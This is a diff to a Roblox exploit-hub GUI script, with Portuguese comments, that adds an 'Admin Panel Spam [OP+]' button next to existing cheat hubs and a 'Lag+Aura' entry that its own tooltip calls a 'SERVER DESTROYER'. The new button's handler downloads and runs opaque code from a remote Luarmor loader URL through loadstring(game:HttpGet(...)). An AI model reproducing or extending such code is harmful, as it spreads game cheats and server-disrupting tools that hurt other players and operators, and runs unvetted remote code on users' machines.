@@ -8,7 +8,7 @@ local RunService = game:GetService("RunService")
 -- Configurações
 local DRAG_SPEED = 0.25
 local EMOJI_ANIMATION_SPEED = 2
-local MAXIMIZED_SIZE = UDim2.new(0, 400, 0, 660)
+local MAXIMIZED_SIZE = UDim2.new(0, 400, 0, 710)
 local MINIMIZED_SIZE = UDim2.new(0, 200, 0, 60)
 
 -- Cria a interface principal
@@ -30,7 +30,7 @@ end
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "AppleFrame"
 MainFrame.Size = MAXIMIZED_SIZE
-MainFrame.Position = UDim2.new(0.5, -200, 0.5, -330)
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -355)
 MainFrame.BackgroundColor3 = Color3.fromRGB(255, 59, 48) -- Vermelho maçã
 MainFrame.BackgroundTransparency = 0.1
 MainFrame.BorderSizePixel = 0
@@ -140,7 +140,7 @@ ScriptsContainer.BackgroundTransparency = 1
 ScriptsContainer.BorderSizePixel = 0
 ScriptsContainer.ScrollBarThickness = 5
 ScriptsContainer.ScrollBarImageColor3 = Color3.fromRGB(255, 255, 255)
-ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, 360)
+ScriptsContainer.CanvasSize = UDim2.new(0, 0, 0, 430)
 
 -- Layout dos scripts
 local UIListLayout = Instance.new("UIListLayout")
@@ -271,7 +271,7 @@ KurdIcon.TextSize = 24
 KurdIcon.Font = Enum.Font.GothamBold
 KurdIcon.TextColor3 = Color3.fromRGB(34, 139, 34)
 
--- Botão Lag+Aura (NOVO)
+-- Botão Lag+Aura
 local LagAuraButton = Instance.new("TextButton")
 LagAuraButton.Name = "LagAura"
 LagAuraButton.Size = UDim2.new(1, 0, 0, 60)
@@ -300,7 +300,38 @@ LagAuraIcon.BackgroundTransparency = 1
 LagAuraIcon.Text = "💀"
 LagAuraIcon.TextSize = 24
 LagAuraIcon.Font = Enum.Font.GothamBold
-LagAuraIcon.TextColor3 = Color3.fromRGB(178, 34, 34) -- Vermelho escuro
+LagAuraIcon.TextColor3 = Color3.fromRGB(178, 34, 34)
+
+-- Botão Admin Panel Spam [OP+] (NOVO)
+local AdminSpamButton = Instance.new("TextButton")
+AdminSpamButton.Name = "AdminSpam"
+AdminSpamButton.Size = UDim2.new(1, 0, 0, 60)
+AdminSpamButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+AdminSpamButton.BackgroundTransparency = 0.3
+AdminSpamButton.Text = ""
+AdminSpamButton.AutoButtonColor = false
+AdminSpamButton.BorderSizePixel = 0
+
+local AdminSpamLabel = Instance.new("TextLabel")
+AdminSpamLabel.Name = "Label"
+AdminSpamLabel.Size = UDim2.new(1, -60, 1, 0)
+AdminSpamLabel.Position = UDim2.new(0, 50, 0, 0)
+AdminSpamLabel.BackgroundTransparency = 1
+AdminSpamLabel.Text = "Admin Panel Spam [OP+]"
+AdminSpamLabel.TextSize = 18
+AdminSpamLabel.Font = Enum.Font.GothamBold
+AdminSpamLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+AdminSpamLabel.TextXAlignment = Enum.TextXAlignment.Left
+
+local AdminSpamIcon = Instance.new("TextLabel")
+AdminSpamIcon.Name = "Icon"
+AdminSpamIcon.Size = UDim2.new(0, 40, 0, 40)
+AdminSpamIcon.Position = UDim2.new(0, 5, 0.5, -20)
+AdminSpamIcon.BackgroundTransparency = 1
+AdminSpamIcon.Text = "👑"
+AdminSpamIcon.TextSize = 24
+AdminSpamIcon.Font = Enum.Font.GothamBold
+AdminSpamIcon.TextColor3 = Color3.fromRGB(255, 215, 0)
 
 -- Montagem da interface
 Shadow.Parent = MainFrame
@@ -335,6 +366,10 @@ KurdIcon.Parent = KurdButton
 LagAuraButton.Parent = ScriptsContainer
 LagAuraLabel.Parent = LagAuraButton
 LagAuraIcon.Parent = LagAuraButton
+
+AdminSpamButton.Parent = ScriptsContainer
+AdminSpamLabel.Parent = AdminSpamButton
+AdminSpamIcon.Parent = AdminSpamButton
 
 -- Variáveis de estado
 local isDragging = false
@@ -543,7 +578,6 @@ KurdButton.MouseButton1Click:Connect(function()
     KurdLabel.Text = "Kurd Hub [OP]"
 end)
 
--- Função do Lag+Aura (NOVO)
 LagAuraButton.MouseButton1Click:Connect(function()
     animateClick(LagAuraButton)
     
@@ -601,6 +635,76 @@ LagAuraButton.MouseButton1Click:Connect(function()
     LagAuraLabel.Text = "Lag+Aura [OP]"
 end)
 
+-- Função do Admin Panel Spam (NOVO)
+AdminSpamButton.MouseButton1Click:Connect(function()
+    animateClick(AdminSpamButton)
+    
+    -- Efeito visual especial para OP+
+    AdminSpamIcon.Text = "✨"
+    AdminSpamLabel.Text = "Iniciando Admin Panel..."
+    
+    -- Efeito de brilho
+    local originalColor = AdminSpamButton.BackgroundColor3
+    local glowEffect = RunService.Heartbeat:Connect(function()
+        local glow = math.sin(os.clock() * 8) * 0.2 + 0.8
+        AdminSpamButton.BackgroundColor3 = Color3.new(
+            math.min(originalColor.R * glow + 0.1, 1),
+            math.min(originalColor.G * glow + 0.05, 1),
+            math.min(originalColor.B * glow, 1)
+        )
+    end)
+    
+    task.wait(0.5)
+    
+    -- Executar o script
+    local success, error = pcall(function()
+        AdminSpamIcon.Text = "🔄"
+        AdminSpamLabel.Text = "Carregando Luarmor..."
+        
+        task.wait(0.3)
+        
+        loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/fc9523e876bada3b7ed4ebe004cb8cf9.lua"))()
+    end)
+    
+    if success then
+        AdminSpamIcon.Text = "👑"
+        AdminSpamLabel.Text = "Admin Panel [ATIVADO]"
+        
+        -- Efeito de coroa brilhante
+        local crownGlow = RunService.Heartbeat:Connect(function()
+            local pulse = math.sin(os.clock() * 6) * 0.3 + 0.7
+            AdminSpamIcon.TextColor3 = Color3.new(
+                1, -- R
+                0.843 + pulse * 0.15, -- G (dourado)
+                0 -- B
+            )
+            
+            -- Efeito de sombra dourada
+            local shadowOffset = math.sin(os.clock() * 4) * 2
+            AdminSpamIcon.Position = UDim2.new(0, 5 + shadowOffset, 0.5, -20)
+        end)
+        
+        -- Manter efeito por 5 segundos
+        task.wait(5)
+        crownGlow:Disconnect()
+        AdminSpamIcon.Position = UDim2.new(0, 5, 0.5, -20)
+        
+    else
+        AdminSpamIcon.Text = "❌"
+        AdminSpamLabel.Text = "Admin Panel [ERRO]"
+        warn("Erro ao executar Admin Panel Spam:", error)
+    end
+    
+    -- Parar efeito de brilho
+    glowEffect:Disconnect()
+    AdminSpamButton.BackgroundColor3 = originalColor
+    
+    task.wait(1)
+    AdminSpamIcon.Text = "👑"
+    AdminSpamIcon.TextColor3 = Color3.fromRGB(255, 215, 0)
+    AdminSpamLabel.Text = "Admin Panel Spam [OP+]"
+end)
+
 -- Efeitos hover
 local function setupHoverEffects(button, icon, label, originalText, originalIcon)
     button.MouseEnter:Connect(function()
@@ -613,6 +717,13 @@ local function setupHoverEffects(button, icon, label, originalText, originalIcon
             local shakeY = math.random(-2, 2)
             icon.Position = UDim2.new(0, 5 + shakeX, 0.5, -20 + shakeY)
         end
+        
+        -- Efeito especial para Admin Panel Spam
+        if button.Name == "AdminSpam" then
+            icon.Text = "✨"
+            local rotation = math.sin(os.clock() * 10) * 5
+            icon.Rotation = rotation
+        end
     end)
     
     button.MouseLeave:Connect(function()
@@ -623,6 +734,12 @@ local function setupHoverEffects(button, icon, label, originalText, originalIcon
         if button.Name == "LagAura" then
             icon.Position = UDim2.new(0, 5, 0.5, -20)
         end
+        
+        -- Resetar Admin Panel Spam
+        if button.Name == "AdminSpam" then
+            icon.Text = originalIcon
+            icon.Rotation = 0
+        end
     end)
 end
 
@@ -631,6 +748,7 @@ setupHoverEffects(ChilliButton, ChilliIcon, ChilliLabel, "Chilli Hub [OP]", "�
 setupHoverEffects(UCTButton, UCTIcon, UCTLabel, "UCT HUB [OP]", "⚡")
 setupHoverEffects(KurdButton, KurdIcon, KurdLabel, "Kurd Hub [OP]", "🏔️")
 setupHoverEffects(LagAuraButton, LagAuraIcon, LagAuraLabel, "Lag+Aura [OP]", "💀")
+setupHoverEffects(AdminSpamButton, AdminSpamIcon, AdminSpamLabel, "Admin Panel Spam [OP+]", "👑")
 
 -- Animação contínua do emoji
 RunService.RenderStepped:Connect(animateEmoji)
@@ -643,8 +761,9 @@ print("2. 🌶️ Chilli Hub [OP]")
 print("3. ⚡ UCT HUB [OP]")
 print("4. 🏔️ Kurd Hub [OP]")
 print("5. 💀 Lag+Aura [OP] - CUIDADO!")
+print("6. 👑 Admin Panel Spam [OP+] - SUPER ADMIN!")
 print("")
-print("⚠️  Atenção: Lag+Aura pode causar instabilidade no servidor!")
+print("⚠️  Atenção: Alguns scripts podem causar instabilidade!")
 print("📢 Use com responsabilidade!")
 
 -- Adiciona borda arredondada
@@ -659,6 +778,7 @@ ButtonCorner:Clone().Parent = ChilliButton
 ButtonCorner:Clone().Parent = UCTButton
 ButtonCorner:Clone().Parent = KurdButton
 ButtonCorner:Clone().Parent = LagAuraButton
+ButtonCorner:Clone().Parent = AdminSpamButton
 
 local TitleCorner = Instance.new("UICorner")
 TitleCorner.CornerRadius = UDim.new(0, 15)
@@ -692,6 +812,7 @@ addButtonEffect(ChilliButton)
 addButtonEffect(UCTButton)
 addButtonEffect(KurdButton)
 addButtonEffect(LagAuraButton)
+addButtonEffect(AdminSpamButton)
 
 -- Efeito especial para Lag+Aura (glitch)
 local function addLagAuraEffect()
@@ -713,6 +834,27 @@ local function addLagAuraEffect()
     return glitchEffect
 end
 
+-- Efeito especial para Admin Panel Spam (brilho dourado)
+local function addAdminSpamEffect()
+    local adminEffect = RunService.Heartbeat:Connect(function()
+        if math.random(1, 100) <= 10 then -- 10% de chance de efeito
+            local sparkle = math.random(1, 3)
+            if sparkle == 1 then
+                AdminSpamIcon.Text = "⭐"
+            elseif sparkle == 2 then
+                AdminSpamIcon.Text = "✨"
+            else
+                AdminSpamIcon.Text = "👑"
+            end
+            
+            task.wait(0.15)
+            AdminSpamIcon.Text = "👑"
+        end
+    end)
+    
+    return adminEffect
+end
+
 -- Tooltips
 local function addTooltip(button, description)
     button.MouseEnter:Connect(function()
@@ -729,26 +871,31 @@ addTooltip(ChilliButton, "Execute Chilli Hub - Script picante")
 addTooltip(UCTButton, "Execute UCT HUB - Script eletrizante")
 addTooltip(KurdButton, "Execute Kurd Hub - Script das montanhas")
 addTooltip(LagAuraButton, "⚠️ SERVER DESTROYER ⚠️ - Use com cuidado!")
+addTooltip(AdminSpamButton, "👑 ADMIN PANEL SPAM [OP+] - Poder máximo!")
 
--- Iniciar efeito do Lag+Aura
+-- Iniciar efeitos especiais
 local lagAuraGlitch = addLagAuraEffect()
+local adminSpamEffect = addAdminSpamEffect()
 
 -- Limpar efeitos ao fechar
 CloseButton.MouseButton1Click:Connect(function()
     if lagAuraGlitch then
         lagAuraGlitch:Disconnect()
     end
+    if adminSpamEffect then
+        adminSpamEffect:Disconnect()
+    end
     ScreenGui:Destroy()
 end)
 
--- Adicionar aviso especial para Lag+Aura
+-- Adicionar aviso especial para scripts perigosos
 local warningLabel = Instance.new("TextLabel")
 warningLabel.Name = "Warning"
 warningLabel.Size = UDim2.new(1, -10, 0, 25)
 warningLabel.Position = UDim2.new(0, 5, 1, -30)
 warningLabel.BackgroundColor3 = Color3.fromRGB(139, 0, 0)
 warningLabel.BackgroundTransparency = 0.3
-warningLabel.Text = "⚠️ Lag+Aura: Pode causar crash no servidor!"
+warningLabel.Text = "⚠️ Cuidado com Lag+Aura e Admin Panel!"
 warningLabel.TextSize = 12
 warningLabel.Font = Enum.Font.GothamBold
 warningLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -760,14 +907,53 @@ local warningCorner = Instance.new("UICorner")
 warningCorner.CornerRadius = UDim.new(0, 8)
 warningCorner.Parent = warningLabel
 
--- Mostrar aviso quando hover no Lag+Aura
-LagAuraButton.MouseEnter:Connect(function()
-    warningLabel.Visible = true
-end)
+-- Mostrar aviso quando hover em scripts perigosos
+local function setupWarningHover(button)
+    button.MouseEnter:Connect(function()
+        warningLabel.Visible = true
+    end)
+    
+    button.MouseLeave:Connect(function()
+        warningLabel.Visible = false
+    end)
+end
 
-LagAuraButton.MouseLeave:Connect(function()
-    warningLabel.Visible = false
-end)
+setupWarningHover(LagAuraButton)
+setupWarningHover(AdminSpamButton)
+
+-- Badge especial para Admin Panel Spam
+local premiumBadge = Instance.new("TextLabel")
+premiumBadge.Name = "PremiumBadge"
+premiumBadge.Size = UDim2.new(0, 25, 0, 25)
+premiumBadge.Position = UDim2.new(1, -30, 0, 5)
+premiumBadge.BackgroundColor3 = Color3.fromRGB(255, 215, 0)
+premiumBadge.BackgroundTransparency = 0.2
+premiumBadge.Text = "⚡"
+premiumBadge.TextSize = 14
+premiumBadge.Font = Enum.Font.GothamBold
+premiumBadge.TextColor3 = Color3.fromRGB(0, 0, 0)
+premiumBadge.Parent = AdminSpamButton
+
+local badgeCorner = Instance.new("UICorner")
+badgeCorner.CornerRadius = UDim.new(0, 12)
+badgeCorner.Parent = premiumBadge
+
+-- Badge para Lag+Aura
+local dangerBadge = Instance.new("TextLabel")
+dangerBadge.Name = "DangerBadge"
+dangerBadge.Size = UDim2.new(0, 25, 0, 25)
+dangerBadge.Position = UDim2.new(1, -30, 0, 5)
+dangerBadge.BackgroundColor3 = Color3.fromRGB(178, 34, 34)
+dangerBadge.BackgroundTransparency = 0.2
+dangerBadge.Text = "💀"
+dangerBadge.TextSize = 14
+dangerBadge.Font = Enum.Font.GothamBold
+dangerBadge.TextColor3 = Color3.fromRGB(255, 255, 255)
+dangerBadge.Parent = LagAuraButton
+
+local dangerCorner = Instance.new("UICorner")
+dangerCorner.CornerRadius = UDim.new(0, 12)
+dangerCorner.Parent = dangerBadge
 
 -- Ajustar tamanho inicial do canvas
 task.wait(0.1)
